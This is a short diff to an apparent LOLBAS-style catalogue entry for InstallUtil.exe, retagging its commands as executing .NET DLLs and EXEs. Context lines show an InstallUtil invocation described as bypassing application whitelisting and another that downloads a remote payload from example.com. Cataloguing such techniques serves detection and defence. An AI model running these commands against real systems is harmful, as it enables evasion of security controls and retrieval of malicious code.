@@ -12,8 +12,8 @@ Commands:
     MitreID: T1218.004
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
     Tags:
-      - Execute: DLL
-      - Input: Custom Format
+      - Execute: DLL (.NET)
+      - Execute: EXE (.NET)
   - Command: InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll
     Description: Execute the target .NET DLL or EXE.
     Usecase: Use to execute code and bypass application whitelisting
@@ -22,8 +22,8 @@ Commands:
     MitreID: T1218.004
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
     Tags:
-      - Execute: DLL
-      - Input: Custom Format
+      - Execute: DLL (.NET)
+      - Execute: EXE (.NET)
   - Command: InstallUtil.exe https://example.com/payload
     Description: It will download a remote payload and place it in INetCache.
     Usecase: Downloads payload from remote server
